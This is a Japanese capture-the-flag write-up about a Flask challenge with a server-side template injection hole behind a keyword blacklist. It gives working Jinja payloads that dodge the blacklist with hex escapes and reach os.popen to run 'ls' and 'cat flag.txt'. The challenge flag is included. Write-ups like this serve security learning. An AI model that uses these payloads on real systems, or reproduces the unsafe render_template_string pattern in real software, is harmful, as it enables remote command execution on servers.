# Writeup

以下のソースコードが与えられる。

```py
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, redirect, url_for
from base64 import b64encode, b64decode

app = Flask(__name__)

@app.route('/')
def index():
  # i dont remember how to return a string in flask so
  # here goes nothing :rooNervous:
  return render_template_string(open('templates/index.html').read())

@app.route('/backend')
def backend():
  website_b64 = b64encode(request.args['content'].encode())
  return redirect(url_for('site', content=website_b64))

@app.route('/site')
def site():
  content = b64decode(request.args['content']).decode()
  #prevent xss
  blacklist = ['script', 'iframe', 'cookie', 'document', "las", "bas", "bal", ":roocursion:"] # no roocursion allowed
  for word in blacklist:
    if word in content:
      # this should scare them away
      content = "*** stack smashing detected ***: python3 terminated"
  csp = '''<head>\n<meta http-equiv="Content-Security-Policy" content="default-src 'none'">\n</head>\n'''
  return render_template_string(csp + content)
```

Flask の SSTI が使えることが分かった。

`global`の`bal`等がブラックリストに登録されているが、`a = 0x61`とすればすり抜けられる。

以下を入力すると、

```
{{request['application']['\x5f\x5fglob\x61ls\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}
```

```
app.py flag.txt templates
```

と表示された。

よって、以下を入力することにより、`flag.txt`の中身を見ることができる。

```
{{request['application']['\x5f\x5fglob\x61ls\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag.txt')['read']()}}
```

<!-- ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:} -->
